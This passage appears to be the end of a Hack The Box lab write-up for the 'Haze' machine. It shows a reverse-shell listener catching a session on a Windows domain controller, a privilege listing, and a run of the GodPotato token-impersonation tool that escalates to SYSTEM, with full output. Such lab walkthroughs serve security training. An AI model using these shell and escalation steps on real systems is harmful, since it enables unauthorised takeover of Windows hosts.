+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~$ penelope -i tun0 9999</span><br><span class="line">[+] Listening <span class="keyword">for</span> reverse shells on 10.10.16.6:9999</span><br><span class="line">➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)</span><br><span class="line">[+] Got reverse shell from DC01-10.10.11.61-Microsoft_Windows_Server_2022_Standard-x64-based_PC 😍️ Assigned SessionID &lt;1&gt;</span><br><span class="line">[+] Added readline support...</span><br><span class="line">[+] Interacting with session [1], Shell Type: Basic, Menu key: Ctrl-D</span><br><span class="line">[+] Logging to /home/muyi/.penelope/DC01~10.10.11.61_Microsoft_Windows_Server_2022_Standard_x64-based_PC/2025_03_30-21_50_35-559.<span class="built_in">log</span> 📜</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">PS C:\Windows\system32&gt; <span class="built_in">whoami</span></span><br><span class="line">haze\alexander.green</span><br><span class="line">PS C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>Inside alexander.green, there are SeImpersonate Privilege enabled</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Privilege Name                Description                               State</span><br><span class="line">============================= ========================================= ========</span><br><span class="line">SeMachineAccountPrivilege     Add workstations to domain                Disabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled</span><br><span class="line">SeImpersonatePrivilege        Impersonate a client after authentication Enabled</span><br><span class="line">SeCreateGlobalPrivilege       Create global objects                     Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working <span class="built_in">set</span>            Disabled</span><br></pre></td></tr></table></figure></div>
+
+<p>Importing GodPotato and run it</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\alexander.green\Desktop&gt; .\godp.exe</span><br><span class="line"></span><br><span class="line">    FFFFF                   FFF  FFFFFFF</span><br><span class="line">   FFFFFFF                  FFF  FFFFFFFF</span><br><span class="line">  FFF  FFFF                 FFF  FFF   FFF             FFF                  FFF</span><br><span class="line">  FFF   FFF                 FFF  FFF   FFF             FFF                  FFF</span><br><span class="line">  FFF   FFF                 FFF  FFF   FFF             FFF                  FFF</span><br><span class="line"> FFFF        FFFFFFF   FFFFFFFF  FFF   FFF  FFFFFFF  FFFFFFFFF   FFFFFF  FFFFFFFFF    FFFFFF</span><br><span class="line"> FFFF       FFFF FFFF  FFF FFFF  FFF  FFFF FFFF FFFF   FFF      FFF  FFF    FFF      FFF FFFF</span><br><span class="line"> FFFF FFFFF FFF   FFF FFF   FFF  FFFFFFFF  FFF   FFF   FFF      F    FFF    FFF     FFF   FFF</span><br><span class="line"> FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF         FFFFF    FFF     FFF   FFFF</span><br><span class="line"> FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF      FFFFFFFF    FFF     FFF   FFFF</span><br><span class="line">  FFF   FFF FFF   FFF FFF   FFF  FFF       FFF   FFF   FFF     FFFF  FFF    FFF     FFF   FFFF</span><br><span class="line">  FFFF FFFF FFFF  FFF FFFF  FFF  FFF       FFF  FFFF   FFF     FFFF  FFF    FFF     FFFF  FFF</span><br><span class="line">   FFFFFFFF  FFFFFFF   FFFFFFFF  FFF        FFFFFFF     FFFFFF  FFFFFFFF    FFFFFFF  FFFFFFF</span><br><span class="line">    FFFFFFF   FFFFF     FFFFFFF  FFF         FFFFF       FFFFF   FFFFFFFF     FFFF     FFFF</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Arguments:</span><br><span class="line"></span><br><span class="line">        -cmd Required:True CommandLine (default cmd /c <span class="built_in">whoami</span>)</span><br><span class="line"></span><br><span class="line">Example:</span><br><span class="line"></span><br><span class="line">GodPotato -cmd <span class="string">&quot;cmd /c whoami&quot;</span></span><br><span class="line">GodPotato -cmd <span class="string">&quot;cmd /c whoami&quot;</span></span><br><span class="line"></span><br><span class="line">PS C:\Users\alexander.green\Desktop&gt; .\godp.exe -cmd <span class="string">&quot;cmd /c whoami&quot;</span></span><br><span class="line">[*] CombaseModule: 0x140719190310912</span><br><span class="line">[*] DispatchTable: 0x140719192901960</span><br><span class="line">[*] UseProtseqFunction: 0x140719192193856</span><br><span class="line">[*] UseProtseqFunctionParamCount: 6</span><br><span class="line">[*] HookRPC</span><br><span class="line">[*] Start PipeServer</span><br><span class="line">[*] CreateNamedPipe \\.\pipe\9e0858c9-8f03-47ef-9ba3-e132fc4bde56\pipe\epmapper</span><br><span class="line">[*] Trigger RPCSS</span><br><span class="line">[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046</span><br><span class="line">[*] DCOM obj IPID: 00008002-04ec-ffff-342a-7b8b207ac5da</span><br><span class="line">[*] DCOM obj OXID: 0x2c39167138254dec</span><br><span class="line">[*] DCOM obj OID: 0x27832f3cdb282e89</span><br><span class="line">[*] DCOM obj Flags: 0x281</span><br><span class="line">[*] DCOM obj PublicRefs: 0x0</span><br><span class="line">[*] Marshal Object bytes len: 100</span><br><span class="line">[*] UnMarshal Object</span><br><span class="line">[*] Pipe Connected!</span><br><span class="line">[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">[*] CurrentsImpersonationLevel: Impersonation</span><br><span class="line">[*] Start Search System Token</span><br><span class="line">[*] PID : 928 Token:0x764  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation</span><br><span class="line">[*] Find System Token : True</span><br><span class="line">[*] UnmarshalObject: 0x80070776</span><br><span class="line">[*] CurrentUser: NT AUTHORITY\SYSTEM</span><br><span class="line">[*] process start with pid 1848</span><br></pre></td></tr></table></figure></div>
+
+<p>PWN</p>
+
+		</div>
+
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/HTB/">#HTB</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Windows/">#Windows</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2025/07/04/Hackthebox/htb-rustykey/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">HTB-RustyKey</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/06/22/Hackthebox/htb-artificial/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">HTB-Artificial</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">HTB-Haze</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Priv-Esc"><span class="nav-text">Priv Esc</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2025</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-regular fa-computer-classic"></i>&nbsp;&nbsp;<a href="/">Muyi</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        37 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
+        </div>
+        
+        
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog "></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
+</div>
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
